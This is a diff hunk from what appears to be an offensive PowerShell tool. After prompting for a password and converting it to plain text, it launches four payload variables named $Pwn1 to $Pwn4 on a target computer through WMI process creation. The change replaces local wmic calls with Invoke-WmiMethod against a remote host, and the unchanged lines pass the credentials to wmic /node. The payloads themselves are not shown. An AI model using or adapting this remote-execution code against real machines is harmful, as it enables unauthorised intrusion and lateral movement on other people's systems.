@@ -270,10 +270,10 @@ if($Language -in 'Spanish') {
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
         if(!$PlainTextPassword) { Write-Host "******" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-	if(!$user) { wmic path win32_process call create "powershell.exe $Pwn1"
-        wmic path win32_process call create "powershell.exe $Pwn2"
-        wmic path win32_process call create "powershell.exe $Pwn3"
-        wmic path win32_process call create "powershell.exe $Pwn4" }
+	if(!$user) { Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn1
+        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn2
+	Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn3
+	Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn4 }
         if($user) { wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn1"
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn2"
         wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn3"
